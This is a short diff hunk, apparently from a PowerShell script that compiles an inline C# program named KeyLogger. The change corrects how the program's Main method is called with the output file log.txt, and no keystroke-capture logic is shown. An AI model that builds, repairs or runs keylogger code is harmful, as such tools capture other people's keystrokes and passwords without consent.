@@ -59,4 +59,4 @@ namespace KeyLogger {
 }
 "@ -ReferencedAssemblies System.Windows.Forms
 
-[KeyLogger.Program]::Main(["log.txt"]);
+[KeyLogger.Program]::Main("log.txt");
